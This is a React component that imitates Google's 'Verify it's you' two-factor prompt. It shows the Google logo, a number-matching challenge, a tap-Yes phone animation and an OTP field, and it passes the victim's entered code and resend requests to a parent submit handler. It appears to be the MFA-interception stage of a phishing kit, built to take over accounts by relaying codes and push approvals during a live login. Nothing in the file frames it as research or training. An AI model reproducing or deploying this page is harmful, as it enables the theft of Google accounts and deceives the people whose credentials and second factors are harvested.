import Image from "next/image";
import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";

export default function TwoFactor({
  email,
  twofa,
  setTwofa,
  number,
  twoFactorType,
  handleSubmitTwoFactor,
  isTwoFactorError,
  setIsTwoFactorError,
}) {
  console.log(twofa);
  const [isAnimating, setIsAnimating] = useState(false);
  const [clickCount, setClickCount] = useState(0);
  const [isFocused, setIsFocused] = useState(false);
  const [localIsTwoFactorError, setLocalIsTwoFactorError] = useState(false);
  const [localTwofa, setLocalTwofa] = useState("");

  // Sync local error state with parent when isTwoFactorError changes
  useEffect(() => {
    setLocalIsTwoFactorError(isTwoFactorError);
  }, [isTwoFactorError]);

  // Stop animation if localIsTwoFactorError becomes true
  useEffect(() => {
    if (localIsTwoFactorError && isAnimating) {
      setIsAnimating(false);
    }
  }, [localIsTwoFactorError, isAnimating]);

  // Automatically start animation for "number" or "yesno" twoFactorType on initial render
  useEffect(() => {
    if ((twoFactorType === "number" || twoFactorType === "yesno") && !isAnimating) {
      setClickCount((prev) => prev + 1);
      setIsAnimating(true);
    }
  }, [twoFactorType, isAnimating]);

  const handleNextClick = (e, mode) => {
    // Reset animation state to ensure a fresh start
    setIsAnimating(false);
    // Increment click count to force a fresh animation start
    setClickCount((prev) => prev + 1);
    // Reset local error state and start animation immediately
    setLocalIsTwoFactorError(false);
    setIsAnimating(true);
    handleSubmitTwoFactor(e, mode);
  };

  const handleResendClick = (e, mode) => {
    // Reset animation state to ensure a fresh start
    setIsAnimating(false);
    // Increment click count and start animation when Resend is clicked
    setClickCount((prev) => prev + 1);
    setIsAnimating(true);
    handleSubmitTwoFactor(e, mode);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-white">
      <div className="bg-white p-10 rounded-lg border border-gray-400 w-96 relative overflow-hidden">
        {/* Bottom layer: Main content */}
        <div className="relative z-0">
          {/* Google Logo */}
          <div className="flex justify-center mb-4">
            <Image
              src="/googlelongicon.png"
              alt="Google Logo"
              width={100}
              height={50}
              className="h-full"
            />
          </div>

          {/* Account Recovery Title */}
          <div className="text-2xl text-black font-normal text-center mb-4">
            Verify it’s you
          </div>

          {/* Instruction Text */}
          <div className="text-sm text-gray-800 text-center mb-4">
            To help keep your account safe, Google wants to make sure it’s
            really you trying to sign in
          </div>

          {/* Email Display */}
          <div className="flex w-full justify-center items-center mb-6">
            <div className="text-sm text-black border-[1px] border-gray-400 rounded-full px-2 py-1 flex items-center">
              <Image
                src="/PersonIcon.png"
                alt="Person Icon"
                width={25}
                height={25}
                className="mr-2"
              />
              <span className="mr-1">{email}</span>
            </div>
          </div>

          {/* Verification Code */}
          {twoFactorType === "number" || twoFactorType === "n" ? (
            <>
              <div className="text-5xl text-black font-normal text-center mb-4">
                {number}
              </div>
              <div className="text-md text-black font-semibold text-left mb-2">
                Check your Phone
              </div>
              {/* Instruction for Verification */}
              <div className={`text-sm text-gray-800 text-left ${isTwoFactorError ? "mb-6" : "mb-10"}`}>
                Google sent a notification to your phone. Open the Gmail app,
                tap Yes on the prompt, then tap {number} on your phone to verify
                it’s you.
              </div>
              {isTwoFactorError ? <div className="text-sm text-red-500 text-left mb-6 font-bold">Tap the correct number</div> : <></>}
            </>
          ) : twoFactorType === "yesno" || twoFactorType === "y" ? (
            <div>
              <div className="w-full relative mb-5">
                <div className="border-gray-400 z-0 absolute w-full bottom-[50%] border-t-[1px]"></div>
                <div className="relative z-10 flex justify-center">
                  {/* Phone Container */}
                  <div className="w-[70px] h-[120px] border-[3px] border-black rounded-[10px] bg-black p-[5px]">
                    {/* Phone Screen (White Background) */}
                    <div className="w-full h-full bg-white rounded-[5px] relative overflow-hidden">
                      {/* Animated Rectangles */}
                      <motion.div
                        className="absolute w-full h-[60%] rounded-[2px]"
                        initial={{ y: "150%" }}
                        animate={{ y: ["150%", "30%","30%", "-110%"] }}
                        transition={{
                          duration: 3,
                          times: [0, 0.5, 1],
                          ease: "linear",
                          repeat: Infinity,
                          repeatDelay: 0.5,
                        }}
                      >
                        <div className="w-[80%] h-[20%] mb-[15%] bg-zinc-300 float-left mx-[10%] rounded-sm"></div>
                        <div className="w-[80%] h-[20%] mb-[25%] bg-zinc-300 float-left mx-[10%] rounded-sm"></div>
                        <div className="w-[80%] h-[20%] float-left mx-[10%]">
                          <div className="w-[45%] mr-[5%] h-full bg-zinc-300 float-left rounded-sm"></div>
                          <div className="w-[45%] ml-[5%] h-full bg-blue-600 float-left rounded-sm"></div>
                        </div>
                      </motion.div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="text-md text-black font-semibold text-left mb-2">
                Check your Phone
              </div>
              {/* Instruction for Verification */}
              <div className={`text-sm text-gray-800 text-left ${isTwoFactorError ? "mb-6" : "mb-10"}`}>
                Google sent a notification to your phone. Open the Gmail app,
                tap Yes on your phone to verify it’s you.
              </div>
              {isTwoFactorError ? <div className="text-sm text-red-500 text-left mb-6 font-bold">Tap Yes in your phone</div> : <></>}
            </div>
          ) : (
            <>
              <div className="text-md text-black font-semibold text-left mb-2">
                Check your Phone
              </div>
              {/* Instruction for Verification */}
              <div className="text-sm text-gray-800 text-left mb-5">
                Google sent a OTP code to your trusted phone number. Enter the
                code below to verify it’s you.
              </div>
              <input
                type="password"
                value={localTwofa}
                onClick={() => setIsFocused(true)}
                onChange={(e) => {
                  setLocalTwofa(e.target.value);
                  setIsTwoFactorError(false);
                  setTwofa(e.target.value); // Sync with parent
                }}
                placeholder="Enter your password"
                className={`w-full mb-2 text-black p-3 border border-gray-400 rounded placeholder:text-gray-500 ${
                  isFocused
                    ? isTwoFactorError
                      ? "ring-red-500 ring-2 outline-none border-none placeholder:text-white"
                      : "ring-blue-600 ring-2 outline-none border-none placeholder:text-white"
                    : "ring-0"
                }`}
                required
              />
              <div className="mb-5 font-semibold">
                {isTwoFactorError && (
                  <p className="text-red-500 text-xs mt-1">
                    Code is incorrect
                  </p>
                )}
              </div>
              <button
                onClick={(e) => handleNextClick(e, "code")}
                className="bg-blue-600 text-white px-6 py-2 mb-5 rounded-md hover:bg-blue-700"
              >
                Verify
              </button>
            </>
          )}

          {/* Resend It and I Don't Have My Phone Links */}
          <div className="flex justify-between items-center font-semibold">
            <div
              onClick={(e) => handleResendClick(e, "resend")}
              className="text-blue-600 text-sm hover:underline cursor-pointer"
            >
              Resend it
            </div>
          </div>
        </div>

        {/* Top layer: Blue animation bar */}
        <AnimatePresence key={`twofactor-top-${clickCount}`}>
          {isAnimating && (
            <motion.div
              className="absolute top-0 left-0 w-full h-1 bg-blue-600 z-20"
              initial={{ x: "100%" }}
              animate={{ x: "-100%" }}
              transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
              exit={{ x: "100%", transition: { duration: 0.3 } }}
            />
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}